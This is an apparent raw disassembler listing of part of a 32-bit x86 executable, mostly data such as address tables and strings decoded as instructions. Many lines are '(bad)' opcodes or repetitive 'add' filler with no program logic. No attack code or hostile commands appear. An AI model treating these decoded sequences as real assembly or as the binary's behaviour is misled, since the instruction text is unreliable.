  40c6dd:	addr16 gs pop esp
  40c6e0:	push   edx
  40c6e1:	gs ins BYTE PTR es:[edi],dx
  40c6e3:	gs popa 
  40c6e5:	jae    0x40c74c
  40c6e7:	pop    esp
  40c6e8:	ins    BYTE PTR es:[edi],dx
  40c6e9:	popa   
  40c6ea:	outs   dx,BYTE PTR ds:[esi]
  40c6eb:	addr16 jne 0x40c74f
  40c6ee:	addr16 gs cs jo 0x40c757
  40c6f3:	bound  eax,QWORD PTR [eax]
	...
  40c6fd:	add    BYTE PTR [eax],al
  40c6ff:	add    al,dl
  40c701:	cmp    eax,DWORD PTR [eax]
  40c703:	add    BYTE PTR [eax-0x67ffff7c],bh
  40c709:	lahf   
	...
  40c71e:	add    BYTE PTR [eax],al
  40c720:	(bad)  
  40c721:	(bad)  
  40c722:	(bad)  
  40c723:	inc    DWORD PTR [eax]
  40c725:	add    BYTE PTR [eax],al
  40c727:	add    BYTE PTR [eax+0xffffff],cl
  40c72d:	add    BYTE PTR [eax],al
  40c72f:	add    dh,bh
  40c731:	(bad)  
  40c732:	(bad)  
  40c733:	inc    DWORD PTR [ebx]
  40c735:	and    BYTE PTR [eax+0x0],al
  40c738:	pop    es
  40c739:	and    BYTE PTR [eax+0x0],al
  40c73c:	(bad)  
  40c73d:	(bad)  
  40c73e:	(bad)  
  40c73f:	dec    ecx
  40c741:	pop    ds
  40c742:	inc    eax
  40c743:	add    ch,bl
  40c745:	pop    ds
  40c746:	inc    eax
  40c747:	add    dh,bh
  40c749:	(bad)  
  40c74a:	(bad)  
  40c74b:	inc    DWORD PTR [eax]
  40c74d:	add    BYTE PTR [eax],al
  40c74f:	add    ah,dl
  40c751:	(bad)  
  40c752:	(bad)  
  40c753:	inc    DWORD PTR [eax]
  40c755:	add    BYTE PTR [eax],al
  40c757:	add    dh,bh
  40c759:	(bad)  
  40c75a:	(bad)  
  40c75b:	inc    DWORD PTR [eax]
  40c75d:	add    BYTE PTR [eax],al
  40c75f:	add    al,bl
  40c761:	es inc eax
  40c763:	add    BYTE PTR [eax],al
  40c765:	add    BYTE PTR [eax],al
  40c767:	add    dh,bh
  40c769:	(bad)  
  40c76a:	(bad)  
  40c76b:	inc    DWORD PTR [eax]
  40c76d:	add    BYTE PTR [eax],al
  40c76f:	add    al,cl
  40c771:	(bad)  
  40c772:	(bad)  
  40c773:	inc    DWORD PTR [eax]
  40c775:	add    BYTE PTR [eax],al
  40c777:	add    dh,bh
  40c779:	(bad)  
  40c77a:	(bad)  
  40c77b:	inc    DWORD PTR [eax]
  40c77d:	add    BYTE PTR [eax],al
  40c77f:	add    BYTE PTR [edi+0x402b],cl
  40c785:	add    BYTE PTR [eax],al
  40c787:	add    dh,bh
  40c789:	(bad)  
  40c78a:	(bad)  
  40c78b:	inc    DWORD PTR [eax]
  40c78d:	add    BYTE PTR [eax],al
  40c78f:	add    BYTE PTR [edi+edi*8+0xffff],cl
  40c796:	add    BYTE PTR [eax],al
  40c798:	(bad)  
  40c799:	(bad)  
  40c79a:	(bad)  
  40c79b:	inc    DWORD PTR [ecx+0x35]
  40c79e:	inc    eax
  40c79f:	add    BYTE PTR [ebp+0x35],al
  40c7a2:	inc    eax
  40c7a3:	add    BYTE PTR [eax],al
  40c7a5:	add    BYTE PTR [eax],al
  40c7a7:	add    dh,bh
  40c7a9:	(bad)  
  40c7aa:	(bad)  
  40c7ab:	inc    DWORD PTR [eax]
  40c7ad:	add    BYTE PTR [eax],al
  40c7af:	add    ah,dl
  40c7b1:	(bad)  
  40c7b2:	(bad)  
  40c7b3:	inc    DWORD PTR [eax]
  40c7b5:	add    BYTE PTR [eax],al
  40c7b7:	add    dh,bh
  40c7b9:	(bad)  
  40c7ba:	(bad)  
  40c7bb:	inc    DWORD PTR [eax]
  40c7bd:	add    BYTE PTR [eax],al
  40c7bf:	add    dl,bl
  40c7c1:	aaa    
  40c7c2:	inc    eax
  40c7c3:	add    dh,bh
  40c7c5:	(bad)  
  40c7c6:	(bad)  
  40c7c7:	inc    DWORD PTR [eax]
  40c7c9:	add    BYTE PTR [eax],al
  40c7cb:	add    cl,ch
  40c7cd:	aaa    
  40c7ce:	inc    eax
  40c7cf:	add    dh,bh
  40c7d1:	(bad)  
  40c7d2:	(bad)  
  40c7d3:	inc    DWORD PTR [eax]
  40c7d5:	add    BYTE PTR [eax],al
  40c7d7:	add    al,bl
  40c7d9:	(bad)  
  40c7da:	(bad)  
  40c7db:	inc    DWORD PTR [eax]
  40c7dd:	add    BYTE PTR [eax],al
  40c7df:	add    dh,bh
  40c7e1:	(bad)  
  40c7e2:	(bad)  
  40c7e3:	inc    DWORD PTR [eax]
  40c7e5:	add    BYTE PTR [eax],al
  40c7e7:	add    BYTE PTR [ecx+edi*1-0x1ffc0],bl
  40c7ee:	(bad)  
  40c7ef:	inc    DWORD PTR [eax]
  40c7f1:	add    BYTE PTR [eax],al
  40c7f3:	add    BYTE PTR [eax-0x1ffbfc7],ch
  40c7f9:	(bad)  
  40c7fa:	(bad)  
  40c7fb:	inc    DWORD PTR [eax]
  40c7fd:	add    BYTE PTR [eax],al
  40c7ff:	add    ah,cl
  40c801:	(bad)  
  40c802:	(bad)  
  40c803:	inc    DWORD PTR [eax]
  40c805:	add    BYTE PTR [eax],al
  40c807:	add    dh,bh
  40c809:	(bad)  
  40c80a:	(bad)  
  40c80b:	inc    DWORD PTR [eax]
  40c80d:	add    BYTE PTR [eax],al
  40c80f:	add    BYTE PTR [esi+0x403f],cl
  40c815:	add    BYTE PTR [eax],al
  40c817:	add    dh,bh
  40c819:	(bad)  
  40c81a:	(bad)  
  40c81b:	inc    DWORD PTR [eax]
  40c81d:	add    BYTE PTR [eax],al
  40c81f:	add    al,dl
  40c821:	(bad)  
  40c822:	(bad)  
  40c823:	inc    DWORD PTR [eax]
  40c825:	add    BYTE PTR [eax],al
  40c827:	add    dh,bh
  40c829:	(bad)  
  40c82a:	(bad)  
  40c82b:	inc    DWORD PTR [eax]
  40c82d:	add    BYTE PTR [eax],al
  40c82f:	add    BYTE PTR [ebp+0x4047],bl
  40c835:	add    BYTE PTR [eax],al
  40c837:	add    dh,bh
  40c839:	(bad)  
  40c83a:	(bad)  
  40c83b:	inc    DWORD PTR [eax]
  40c83d:	add    BYTE PTR [eax],al
  40c83f:	add    ah,dl
  40c841:	(bad)  
  40c842:	(bad)  
  40c843:	inc    DWORD PTR [eax]
  40c845:	add    BYTE PTR [eax],al
  40c847:	add    dh,bh
  40c849:	(bad)  
  40c84a:	(bad)  
  40c84b:	inc    DWORD PTR [eax]
  40c84d:	add    BYTE PTR [eax],al
  40c84f:	add    cl,bh
  40c851:	dec    esp
  40c852:	inc    eax
  40c853:	add    BYTE PTR [eax],al
  40c855:	add    BYTE PTR [eax],al
  40c857:	add    dh,bh
  40c859:	(bad)  
  40c85a:	(bad)  
  40c85b:	inc    DWORD PTR [eax]
  40c85d:	add    BYTE PTR [eax],al
  40c85f:	add    ah,cl
  40c861:	(bad)  
  40c862:	(bad)  
  40c863:	inc    DWORD PTR [eax]
  40c865:	add    BYTE PTR [eax],al
  40c867:	add    dh,bh
  40c869:	(bad)  
  40c86a:	(bad)  
  40c86b:	inc    DWORD PTR [eax]
  40c86d:	add    BYTE PTR [eax],al
  40c86f:	add    dl,cl
  40c871:	push   eax
  40c872:	inc    eax
  40c873:	add    BYTE PTR [eax],al
  40c875:	add    BYTE PTR [eax],al
  40c877:	add    dh,bh
  40c879:	(bad)  
  40c87a:	(bad)  
  40c87b:	inc    DWORD PTR [eax]
  40c87d:	add    BYTE PTR [eax],al
  40c87f:	add    ah,dl
  40c881:	(bad)  
  40c882:	(bad)  
  40c883:	inc    DWORD PTR [eax]
  40c885:	add    BYTE PTR [eax],al
  40c887:	add    dh,bh
  40c889:	(bad)  
  40c88a:	(bad)  
  40c88b:	inc    DWORD PTR [eax]
  40c88d:	add    BYTE PTR [eax],al
  40c88f:	add    BYTE PTR [edx],bh
  40c891:	push   esp
  40c892:	inc    eax
  40c893:	add    BYTE PTR [eax],al
  40c895:	add    BYTE PTR [eax],al
  40c897:	add    dh,bh
  40c899:	(bad)  
  40c89a:	(bad)  
  40c89b:	inc    DWORD PTR [eax]
  40c89d:	add    BYTE PTR [eax],al
  40c89f:	add    ah,dl
  40c8a1:	(bad)  
  40c8a2:	(bad)  
  40c8a3:	inc    DWORD PTR [eax]
  40c8a5:	add    BYTE PTR [eax],al
  40c8a7:	add    dh,bh
  40c8a9:	(bad)  
  40c8aa:	(bad)  
  40c8ab:	inc    DWORD PTR [eax]
  40c8ad:	add    BYTE PTR [eax],al
  40c8af:	add    ch,dh
  40c8b1:	inc    ax
  40c8b3:	add    BYTE PTR [eax],al
  40c8b5:	add    BYTE PTR [eax],al
  40c8b7:	add    dh,bh
  40c8b9:	(bad)  
  40c8ba:	(bad)  
  40c8bb:	inc    DWORD PTR [eax]
  40c8bd:	add    BYTE PTR [eax],al
  40c8bf:	add    ah,dl
  40c8c1:	(bad)  
  40c8c2:	(bad)  
  40c8c3:	inc    DWORD PTR [eax]
  40c8c5:	add    BYTE PTR [eax],al
  40c8c7:	add    dh,bh
  40c8c9:	(bad)  
  40c8ca:	(bad)  
  40c8cb:	inc    DWORD PTR [eax]
  40c8cd:	add    BYTE PTR [eax],al
  40c8cf:	add    BYTE PTR [edi],bl
  40c8d1:	jae    0x40c913
  40c8d3:	add    BYTE PTR [eax],al
  40c8d5:	add    BYTE PTR [eax],al
  40c8d7:	add    dh,bh
  40c8d9:	(bad)  
  40c8da:	(bad)  
  40c8db:	inc    DWORD PTR [eax]
  40c8dd:	add    BYTE PTR [eax],al
  40c8df:	add    ah,dl
  40c8e1:	(bad)  
  40c8e2:	(bad)  
  40c8e3:	inc    DWORD PTR [eax]
  40c8e5:	add    BYTE PTR [eax],al
  40c8e7:	add    dh,bh
  40c8e9:	(bad)  
  40c8ea:	(bad)  
  40c8eb:	inc    DWORD PTR [eax]
  40c8ed:	add    BYTE PTR [eax],al
  40c8ef:	add    cl,ch
  40c8f1:	je     0x40c933
  40c8f3:	add    BYTE PTR [eax],al
  40c8f5:	add    BYTE PTR [eax],al
  40c8f7:	add    dh,bh
  40c8f9:	(bad)  
  40c8fa:	(bad)  
  40c8fb:	inc    DWORD PTR [eax]
  40c8fd:	add    BYTE PTR [eax],al
  40c8ff:	add    al,dl
  40c901:	(bad)  
  40c902:	(bad)  
  40c903:	inc    DWORD PTR [eax]
  40c905:	add    BYTE PTR [eax],al
  40c907:	add    dh,bh
  40c909:	(bad)  
  40c90a:	(bad)  
  40c90b:	inc    DWORD PTR [eax]
  40c90d:	add    BYTE PTR [eax],al
  40c90f:	add    BYTE PTR [esi+0x76],cl
  40c912:	inc    eax
  40c913:	add    BYTE PTR [eax],al
  40c915:	add    BYTE PTR [eax],al
  40c917:	add    dh,bh
  40c919:	(bad)  
  40c91a:	(bad)  
  40c91b:	inc    DWORD PTR [eax]
  40c91d:	add    BYTE PTR [eax],al
  40c91f:	add    al,bl
  40c921:	(bad)  
  40c922:	(bad)  
  40c923:	inc    DWORD PTR [eax]
  40c925:	add    BYTE PTR [eax],al
  40c927:	add    dh,bh
  40c929:	(bad)  
  40c92a:	(bad)  
  40c92b:	dec    DWORD PTR [ebx+0x77]
  40c92e:	inc    eax
  40c92f:	add    BYTE PTR [edi+0x77],cl
  40c932:	inc    eax
  40c933:	add    BYTE PTR [eax],al
  40c935:	add    BYTE PTR [eax],al
  40c937:	add    dh,bh
  40c939:	(bad)  
  40c93a:	(bad)  
  40c93b:	inc    DWORD PTR [eax]
  40c93d:	add    BYTE PTR [eax],al
  40c93f:	add    ah,dl
  40c941:	(bad)  
  40c942:	(bad)  
  40c943:	inc    DWORD PTR [eax]
  40c945:	add    BYTE PTR [eax],al
  40c947:	add    dh,bh
  40c949:	(bad)  
  40c94a:	(bad)  
  40c94b:	inc    DWORD PTR [eax]
  40c94d:	add    BYTE PTR [eax],al
  40c94f:	add    BYTE PTR [esi+0x4078],dl
  40c955:	add    BYTE PTR [eax],al
  40c957:	add    dh,bh
  40c959:	(bad)  
  40c95a:	(bad)  
  40c95b:	inc    DWORD PTR [eax]
  40c95d:	add    BYTE PTR [eax],al
  40c95f:	add    al,bl
  40c961:	(bad)  
  40c962:	(bad)  
  40c963:	inc    DWORD PTR [eax]
  40c965:	add    BYTE PTR [eax],al
  40c967:	add    dh,bh
  40c969:	(bad)  
  40c96a:	(bad)  
  40c96b:	(bad)  
  40c96c:	fstp   TBYTE PTR [ecx+0x40]
  40c96f:	add    bh,ch
  40c971:	jns    0x40c9b3
  40c973:	add    BYTE PTR [eax],al
  40c975:	add    BYTE PTR [eax],al
  40c977:	add    dh,bh
  40c979:	(bad)  
  40c97a:	(bad)  
  40c97b:	inc    DWORD PTR [eax]
  40c97d:	add    BYTE PTR [eax],al
  40c97f:	add    al,al
  40c981:	(bad)  
  40c982:	(bad)  
  40c983:	inc    DWORD PTR [eax]
  40c985:	add    BYTE PTR [eax],al
  40c987:	add    dh,bh
  40c989:	(bad)  
  40c98a:	(bad)  
  40c98b:	inc    DWORD PTR [eax]
  40c98d:	add    BYTE PTR [eax],al
  40c98f:	add    ch,bl
  40c991:	jnp    0x40c9d3
  40c993:	add    BYTE PTR [eax],al
  40c995:	add    BYTE PTR [eax],al
  40c997:	add    dh,bh
  40c999:	(bad)  
  40c99a:	(bad)  
  40c99b:	inc    DWORD PTR [eax]
  40c99d:	add    BYTE PTR [eax],al
  40c99f:	add    al,dl
  40c9a1:	(bad)  
  40c9a2:	(bad)  
  40c9a3:	inc    DWORD PTR [eax]
  40c9a5:	add    BYTE PTR [eax],al
  40c9a7:	add    dh,bh
  40c9a9:	(bad)  
  40c9aa:	(bad)  
  40c9ab:	jmp    FWORD PTR [ebp+0x7c]
  40c9ae:	inc    eax
  40c9af:	add    BYTE PTR [esp+edi*2+0x40],al
  40c9b6:	add    BYTE PTR [eax],al
  40c9b8:	(bad)  
  40c9b9:	(bad)  
  40c9ba:	(bad)  
  40c9bb:	inc    DWORD PTR [eax]
  40c9bd:	add    BYTE PTR [eax],al
  40c9bf:	add    ah,dl
  40c9c1:	(bad)  
  40c9c2:	(bad)  
  40c9c3:	inc    DWORD PTR [eax]
  40c9c5:	add    BYTE PTR [eax],al
  40c9c7:	add    dh,bh
  40c9c9:	(bad)  
  40c9ca:	(bad)  
  40c9cb:	inc    DWORD PTR [eax]
  40c9cd:	add    BYTE PTR [eax],al
  40c9cf:	add    BYTE PTR [edx],cl
  40c9d1:	xchg   DWORD PTR [eax+0x0],eax
  40c9d4:	add    BYTE PTR [eax],al
  40c9d6:	add    BYTE PTR [eax],al
  40c9d8:	(bad)  
  40c9d9:	(bad)  
  40c9da:	(bad)  
  40c9db:	inc    DWORD PTR [eax]
  40c9dd:	add    BYTE PTR [eax],al
  40c9df:	add    al,dl
  40c9e1:	(bad)  
  40c9e2:	(bad)  
  40c9e3:	inc    DWORD PTR [eax]
  40c9e5:	add    BYTE PTR [eax],al
  40c9e7:	add    dh,bh
  40c9e9:	(bad)  
  40c9ea:	(bad)  
  40c9eb:	inc    DWORD PTR [eax]
  40c9ed:	add    BYTE PTR [eax],al
  40c9ef:	add    cl,dl
  40c9f1:	mov    BYTE PTR [eax+0x0],al
  40c9f4:	add    BYTE PTR [eax],al
  40c9f6:	add    BYTE PTR [eax],al
  40c9f8:	(bad)  
  40c9f9:	(bad)  
  40c9fa:	(bad)  
  40c9fb:	inc    DWORD PTR [eax]
  40c9fd:	add    BYTE PTR [eax],al
  40c9ff:	add    ah,cl
  40ca01:	(bad)  
  40ca02:	(bad)  
  40ca03:	inc    DWORD PTR [eax]
  40ca05:	add    BYTE PTR [eax],al
  40ca07:	add    dh,bh
  40ca09:	(bad)  
  40ca0a:	(bad)  
  40ca0b:	inc    DWORD PTR [eax]
  40ca0d:	add    BYTE PTR [eax],al
  40ca0f:	add    BYTE PTR [ebx-0x76],bl
  40ca12:	inc    eax
	...
  40ca1b:	add    BYTE PTR [edi],ah
  40ca1d:	mov    al,BYTE PTR [eax+0x0]
  40ca20:	(bad)  
  40ca21:	(bad)  
  40ca22:	(bad)  
  40ca23:	inc    DWORD PTR [eax]
  40ca25:	add    BYTE PTR [eax],al
  40ca27:	add    ah,dl
  40ca29:	(bad)  
  40ca2a:	(bad)  
  40ca2b:	inc    DWORD PTR [eax]
  40ca2d:	add    BYTE PTR [eax],al
  40ca2f:	add    dh,bh
  40ca31:	(bad)  
  40ca32:	(bad)  
  40ca33:	dec    DWORD PTR [ecx]
  40ca35:	cwde   
  40ca36:	inc    eax
  40ca37:	add    BYTE PTR ds:0x4098,ah
  40ca3d:	add    BYTE PTR [eax],al
  40ca3f:	add    dh,bh
  40ca41:	(bad)  
  40ca42:	(bad)  
  40ca43:	inc    DWORD PTR [eax]
  40ca45:	add    BYTE PTR [eax],al
  40ca47:	add    al,dl
  40ca49:	(bad)  
  40ca4a:	(bad)  
  40ca4b:	inc    DWORD PTR [eax]
  40ca4d:	add    BYTE PTR [eax],al
  40ca4f:	add    dh,bh
  40ca51:	(bad)  
  40ca52:	(bad)  
  40ca53:	inc    DWORD PTR [eax]
  40ca55:	add    BYTE PTR [eax],al
  40ca57:	add    ch,ah
  40ca59:	pushf  
  40ca5a:	inc    eax
  40ca5b:	add    BYTE PTR [eax],al
  40ca5d:	add    BYTE PTR [eax],al
  40ca5f:	add    dh,bh
  40ca61:	(bad)  
  40ca62:	(bad)  
  40ca63:	inc    DWORD PTR [eax]
  40ca65:	add    BYTE PTR [eax],al
  40ca67:	add    ah,dl
  40ca69:	(bad)  
  40ca6a:	(bad)  
  40ca6b:	inc    DWORD PTR [eax]
  40ca6d:	add    BYTE PTR [eax],al
  40ca6f:	add    dh,bh
  40ca71:	(bad)  
  40ca72:	(bad)  
  40ca73:	inc    DWORD PTR [eax]
  40ca75:	add    BYTE PTR [eax],al
  40ca77:	add    bl,ah
  40ca79:	mov    eax,ds:0x40
  40ca7e:	add    BYTE PTR [eax],al
  40ca80:	(bad)  
  40ca81:	(bad)  
  40ca82:	(bad)  
  40ca83:	inc    DWORD PTR [eax]
  40ca85:	add    BYTE PTR [eax],al
  40ca87:	add    al,dl
  40ca89:	(bad)  
  40ca8a:	(bad)  
  40ca8b:	inc    DWORD PTR [eax]
  40ca8d:	add    BYTE PTR [eax],al
  40ca8f:	add    dh,bh
  40ca91:	(bad)  
  40ca92:	(bad)  
  40ca93:	inc    DWORD PTR [eax]
  40ca95:	add    BYTE PTR [eax],al
  40ca97:	add    ch,al
  40ca99:	mov    ds:0x40,al
  40ca9e:	add    BYTE PTR [eax],al
  40caa0:	(bad)  
  40caa1:	(bad)  
  40caa2:	(bad)  
  40caa3:	inc    DWORD PTR [eax]
  40caa5:	add    BYTE PTR [eax],al
  40caa7:	add    al,dl
  40caa9:	(bad)  
  40caaa:	(bad)  
  40caab:	inc    DWORD PTR [eax]
  40caad:	add    BYTE PTR [eax],al
  40caaf:	add    dh,bh
  40cab1:	(bad)  
  40cab2:	(bad)  
  40cab3:	inc    DWORD PTR [eax]
  40cab5:	add    BYTE PTR [eax],al
  40cab7:	add    BYTE PTR [ebx+0x7c0040a9],al
  40cabd:	retf   
	...
  40cac6:	add    BYTE PTR [eax],al
  40cac8:	mov    al,0xcd
  40caca:	add    BYTE PTR [eax],al
  40cacc:	and    BYTE PTR [eax-0x33340000],dh
	...
  40cada:	add    BYTE PTR [eax],al
  40cadc:	jl     0x40caad
  40cade:	add    BYTE PTR [eax],al
  40cae0:	jo     0x40ca93
  40cae2:	add    BYTE PTR [eax],al
  40cae4:	je     0x40cab1
	...
  40caee:	add    BYTE PTR [eax],al
  40caf0:	call   0xb0:0x180000cf
  40caf7:	add    BYTE PTR [eax+0xcc],dh
  40cafd:	add    BYTE PTR [eax],al
  40caff:	add    BYTE PTR [eax],al
  40cb01:	add    BYTE PTR [eax],al
  40cb03:	add    BYTE PTR [esi+0x540000cf],dh
  40cb09:	mov    cl,0x0
  40cb0b:	add    BYTE PTR [eax+0xcc],bh
  40cb11:	add    BYTE PTR [eax],al
  40cb13:	add    BYTE PTR [eax],al
  40cb15:	add    BYTE PTR [eax],al
  40cb17:	add    dh,ch
  40cb19:	iret   
  40cb1a:	add    BYTE PTR [eax],al
  40cb1c:	pop    esp
  40cb1d:	mov    cl,0x0
  40cb1f:	add    BYTE PTR [ebx+ecx*8+0x0],ch
	...
  40cb2b:	add    BYTE PTR [edx],dl
  40cb2d:	rol    BYTE PTR [eax],1
  40cb2f:	add    BYTE PTR [eax],dl
  40cb31:	mov    al,0x0
  40cb33:	add    BYTE PTR [ebx+ecx*8+0x0],bl
	...
  40cb3f:	add    BYTE PTR [edx-0x2b],bl
  40cb42:	add    BYTE PTR [eax],al
  40cb44:	add    BYTE PTR [eax+0x0],dh
	...
  40cb5a:	add    BYTE PTR [eax],al
  40cb5c:	dec    edx
  40cb5d:	aad    0x0
  40cb5f:	add    BYTE PTR [esi],dh
  40cb61:	aad    0x0
  40cb63:	add    BYTE PTR [eax],ch
  40cb65:	aad    0x0
  40cb67:	add    BYTE PTR [eax],al
  40cb69:	add    BYTE PTR [eax],al
  40cb6b:	add    dl,bh
  40cb6d:	iret   
  40cb6e:	add    BYTE PTR [eax],al
  40cb70:	add    BYTE PTR [eax],al
  40cb72:	add    BYTE PTR [eax],al
  40cb74:	mov    bh,cl
  40cb76:	add    BYTE PTR [eax],al
  40cb78:	add    BYTE PTR [eax],al
  40cb7a:	add    BYTE PTR [eax],al
  40cb7c:	xchg   esp,eax
  40cb7d:	int    0x0
  40cb7f:	add    BYTE PTR [edx+0x7a0000cd],al
  40cb85:	int    0x0
  40cb87:	add    BYTE PTR [edx*8-0x2afa0000],dl
  40cb8e:	add    BYTE PTR [eax],al
  40cb90:	clc    
  40cb91:	aam    0x0
  40cb93:	add    ah,ch
  40cb95:	aam    0x0
  40cb97:	add    dl,bl
  40cb99:	aam    0x0
  40cb9b:	add    BYTE PTR [esi-0x33],ch
  40cb9e:	add    BYTE PTR [eax],al
  40cba0:	enter  0xd4,0x0
  40cba4:	mov    dh,0xd4
  40cba6:	add    BYTE PTR [eax],al
  40cba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cba9:	aam    0x0
  40cbab:	add    BYTE PTR [esi-0x7fffff2c],dl
  40cbb1:	aam    0x0
  40cbb3:	add    BYTE PTR [eax-0x2c],dh
  40cbb6:	add    BYTE PTR [eax],al
  40cbb8:	pusha  
  40cbb9:	aam    0x0
  40cbbb:	add    BYTE PTR [esp+edx*8+0x0],dl
  40cbbf:	add    BYTE PTR [esp+edx*8],ch
  40cbc2:	add    BYTE PTR [eax],al
  40cbc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbc5:	int    0x0
  40cbc7:	add    BYTE PTR [esp+edx*8],bl
  40cbca:	add    BYTE PTR [eax],al
  40cbcc:	push   cs
  40cbcd:	aam    0x0
  40cbcf:	add    dh,bh
  40cbd1:	rol    DWORD PTR [eax],cl
  40cbd3:	add    dl,dh
  40cbd5:	rol    DWORD PTR [eax],cl
  40cbd7:	add    BYTE PTR [edx-0x33],dl
  40cbda:	add    BYTE PTR [eax],al
  40cbdc:	and    al,dl
  40cbde:	add    BYTE PTR [eax],al
  40cbe0:	cmp    al,0xd0
  40cbe2:	add    BYTE PTR [eax],al
  40cbe4:	dec    esi
  40cbe5:	rol    BYTE PTR [eax],1
  40cbe7:	add    BYTE PTR [esi-0x30],bl
  40cbea:	add    BYTE PTR [eax],al
  40cbec:	outs   dx,BYTE PTR ds:[esi]
  40cbed:	rol    BYTE PTR [eax],1
  40cbef:	add    BYTE PTR [eax-0x5fffff30],cl
  40cbf5:	rol    BYTE PTR [eax],1
  40cbf7:	add    BYTE PTR [eax-0x35ffff30],bh
  40cbfd:	rol    BYTE PTR [eax],1
  40cbff:	add    dh,bl
  40cc01:	rol    BYTE PTR [eax],1
  40cc03:	add    dl,dh
  40cc05:	rol    BYTE PTR [eax],1
  40cc07:	add    BYTE PTR [esi],cl
  40cc09:	rol    DWORD PTR [eax],1
  40cc0b:	add    BYTE PTR [ecx+edx*8],ch
  40cc0e:	add    BYTE PTR [eax],al
  40cc10:	inc    eax
  40cc11:	rol    DWORD PTR [eax],1
  40cc13:	add    BYTE PTR [ecx+edx*8+0x0],cl
  40cc17:	add    BYTE PTR [eax-0x2f],ah
  40cc1a:	add    BYTE PTR [eax],al
  40cc1c:	outs   dx,BYTE PTR ds:[esi]
  40cc1d:	rol    DWORD PTR [eax],1
  40cc1f:	add    BYTE PTR [edx-0x2f],bh
  40cc22:	add    BYTE PTR [eax],al
  40cc24:	mov    dl,cl
  40cc26:	add    BYTE PTR [eax],al
  40cc28:	mov    al,ds:0xba0000d1
  40cc2d:	rol    DWORD PTR [eax],1
  40cc2f:	add    ah,dl
  40cc31:	rol    DWORD PTR [eax],1
  40cc33:	add    dh,ah
  40cc35:	rol    DWORD PTR [eax],1
  40cc37:	add    al,bh
  40cc39:	rol    DWORD PTR [eax],1
  40cc3b:	add    BYTE PTR [esi],al
  40cc3d:	rol    BYTE PTR [eax],cl
  40cc3f:	add    BYTE PTR [eax],bl
  40cc41:	rol    BYTE PTR [eax],cl
  40cc43:	add    BYTE PTR [eax],dh
  40cc45:	rol    BYTE PTR [eax],cl
  40cc47:	add    BYTE PTR [esi],bh
  40cc49:	rol    BYTE PTR [eax],cl
  40cc4b:	add    BYTE PTR [edx-0x2e],cl
  40cc4e:	add    BYTE PTR [eax],al
  40cc50:	pop    eax
  40cc51:	rol    BYTE PTR [eax],cl
  40cc53:	add    BYTE PTR [edx-0x2e],ah
  40cc56:	add    BYTE PTR [eax],al
  40cc58:	jp     0x40cc2c
  40cc5a:	add    BYTE PTR [eax],al
  40cc5c:	mov    dl,dl
  40cc5e:	add    BYTE PTR [eax],al
  40cc60:	mov    al,ds:0xb80000d2
  40cc65:	rol    BYTE PTR [eax],cl
  40cc67:	add    dh,al
  40cc69:	rol    BYTE PTR [eax],cl
  40cc6b:	add    ah,dl
  40cc6d:	rol    BYTE PTR [eax],cl
  40cc6f:	add    dh,ch
  40cc71:	rol    BYTE PTR [eax],cl
  40cc73:	add    dh,bh
  40cc75:	rol    BYTE PTR [eax],cl
  40cc77:	add    BYTE PTR [ebx+edx*8],dl
  40cc7a:	add    BYTE PTR [eax],al
  40cc7c:	rol    DWORD PTR cs:[eax],cl
  40cc7f:	add    BYTE PTR [eax-0x2d],al
  40cc82:	add    BYTE PTR [eax],al
  40cc84:	push   esi
  40cc85:	rol    DWORD PTR [eax],cl
  40cc87:	add    BYTE PTR [esi-0x2d],ah
  40cc8a:	add    BYTE PTR [eax],al
  40cc8c:	js     0x40cc61
  40cc8e:	add    BYTE PTR [eax],al
  40cc90:	nop
  40cc91:	rol    DWORD PTR [eax],cl
  40cc93:	add    BYTE PTR [eax-0x4bffff2d],ch
  40cc99:	rol    DWORD PTR [eax],cl
  40cc9b:	add    BYTE PTR [esi-0x35ffff2d],bh
  40cca1:	rol    DWORD PTR [eax],cl
  40cca3:	add    ah,bl
  40cca5:	rol    DWORD PTR [eax],cl
  40cca7:	add    BYTE PTR [ecx*8+0x0],bh
  40ccae:	add    BYTE PTR [eax],al
  40ccb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccb1:	iret   
  40ccb2:	add    BYTE PTR [eax],al
  40ccb4:	add    BYTE PTR [eax],al
  40ccb6:	add    BYTE PTR [eax],al
  40ccb8:	ret    0xcf
  40ccbb:	add    dh,cl
  40ccbd:	iret   
  40ccbe:	add    BYTE PTR [eax],al
  40ccc0:	fmul   st,st(7)
  40ccc2:	add    BYTE PTR [eax],al
  40ccc4:	loop   0x40cc95
  40ccc6:	add    BYTE PTR [eax],al
  40ccc8:	add    BYTE PTR [eax],al
  40ccca:	add    BYTE PTR [eax],al
  40cccc:	push   0xffffffcf
  40ccce:	add    BYTE PTR [eax],al
  40ccd0:	pop    esp
  40ccd1:	iret   
  40ccd2:	add    BYTE PTR [eax],al
  40ccd4:	dec    esp
  40ccd5:	iret   
  40ccd6:	add    BYTE PTR [eax],al
  40ccd8:	cmp    cl,bh
  40ccda:	add    BYTE PTR [eax],al
  40ccdc:	cs iret 
  40ccde:	add    BYTE PTR [eax],al
  40cce0:	and    bh,cl
  40cce2:	add    BYTE PTR [eax],al
  40cce4:	push   cs
  40cce5:	iret   
  40cce6:	add    BYTE PTR [eax],al
  40cce8:	dec    dh
  40ccea:	add    BYTE PTR [eax],al
  40ccec:	out    dx,al
  40cced:	into   
  40ccee:	add    BYTE PTR [eax],al
  40ccf0:	loopne 0x40ccc0
  40ccf2:	add    BYTE PTR [eax],al
  40ccf4:	ret    0xce
  40ccf7:	add    BYTE PTR [eax-0x5fffff32],dh
  40ccfd:	into   
  40ccfe:	add    BYTE PTR [eax],al
  40cd00:	xchg   edx,eax
  40cd01:	into   
  40cd02:	add    BYTE PTR [eax],al
  40cd04:	or     dh,0x0
  40cd07:	add    BYTE PTR [esi-0x32],ch
  40cd0a:	add    BYTE PTR [eax],al
  40cd0c:	pop    esp
  40cd0d:	into   
  40cd0e:	add    BYTE PTR [eax],al
  40cd10:	dec    eax
  40cd11:	into   
  40cd12:	add    BYTE PTR [eax],al
  40cd14:	cmp    cl,dh
  40cd16:	add    BYTE PTR [eax],al
  40cd18:	cs into 
  40cd1a:	add    BYTE PTR [eax],al
  40cd1c:	sbb    cl,dh
  40cd1e:	add    BYTE PTR [eax],al
  40cd20:	push   es
  40cd21:	into   
  40cd22:	add    BYTE PTR [eax],al
  40cd24:	out    dx,al
  40cd25:	int    0x0
  40cd27:	add    al,ah
  40cd29:	int    0x0
  40cd2b:	add    ah,cl
  40cd2d:	int    0x0
